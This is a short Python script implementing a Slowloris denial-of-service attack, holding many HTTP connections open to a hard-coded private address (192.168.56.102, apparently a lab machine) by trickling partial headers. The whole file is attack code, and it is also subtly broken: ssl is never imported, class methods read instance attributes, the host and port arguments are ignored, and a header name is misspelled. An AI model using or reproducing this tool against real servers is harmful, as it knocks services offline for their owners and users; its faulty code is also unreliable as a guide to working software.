#!/usr/bin/env python3
import time
import random
import socket
import sys
import logging

USERAGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"

class _(socket.socket):

    def send_line(self, line):
        line = f"{line}\r\n"
        self.send(line.encode("utf-8"))

    def send_header(self, name, value):
        self.send_line(f"{name}: {value}")


socket.socket = _

_list_of_sockets = []

class start_attack(object):

    __slots__=("_host", "_port")


    def __init__(self, _host, _port):
        self._host = _host
        self._port = _port

    @classmethod
    def initialize_socket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        host = self._host
        port = self._port
        s.connect(('192.168.56.102', 80))
        if self._port == 443:
            s = ssl.wrap_socket(s)
        s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
        s.send_header("User-Agent", USERAGENT)
        s.send_header("Accpet-Language", "en-Us, en, q=0.5")
        return s


    @classmethod
    def perform_attack(self, s, socket_count):
       while True:
        try:
            for s in list(_list_of_sockets):
                try:
                    s.send_header("X-a", random.randint(1, 5000))
                except socket.error:
                    _list_of_sockets.remove(s)


            for _ in range(socket_count - len(_list_of_sockets)):
                try:
                    s = self.initialize_socket()
                    if s:
                        _list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            time.sleep(4)

        except (KeyboardInterrupt, SystemExit):
            logging.info("slowloris attack has been stopped")
            break



